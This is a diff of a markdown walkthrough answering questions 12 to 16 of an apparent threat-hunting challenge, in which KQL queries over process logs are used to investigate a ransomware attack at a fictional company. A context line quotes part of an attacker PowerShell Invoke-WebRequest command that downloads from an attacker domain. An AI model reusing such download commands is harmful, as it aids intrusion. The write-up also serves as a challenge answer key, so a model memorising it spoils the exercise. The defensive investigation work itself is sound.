@@ -114,20 +114,40 @@ powershell -c "Invoke-WebRequest -Uri http://notification-finance-services.com/f
 
 **Answer: notification-finance-services.com**<br><br>
 
-**Q12. **<br><br>
+**Q12. What command is run right before the base64-encoded PowerShell?**<br><br>
+From query in question 10.<br><br>
+
+**Answer: gpupdate /force**<br><br>
+
+**Q13. How many devices ran the gpupdate /force command?**<br><br>
+
+```
+ProcessEvents
+| where process_commandline contains "gpupdate /force"
+```
+<br>
+
+**Answer: 306**<br><br>
+
+**Q14. How many machines at Encryptodera ran "systeminfo"?**<br><br>
+
+```
+ProcessEvents
+| where process_commandline contains "systeminfo"
+```
+<br>
+
+**Answer: 8**<br><br>
+
+**Q15. What was the timestamp for the first time the command was run?**<br><br>
+From the previous query.<br><br>
+
+**Answer: 2/2/2024, 3:32:36 AM**<br><br>
+
+**Q.16 How many days elapsed between when the attackers ran discovery commands and when the ransomware attack started?**<br><br>
 **Answer: **<br><br>
 
-**Q13. **<br><br>
-**Answer: **<br><br>
 
-**Q14. **<br><br>
-**Answer: **<br><br>
-
-**Q15. **<br><br>
-**Answer: **<br><br>
-
-**Q. **<br><br>
-**Answer: **<br><br>
 **Q. **<br><br>
 **Answer: **<br><br>
 **Q. **<br><br>
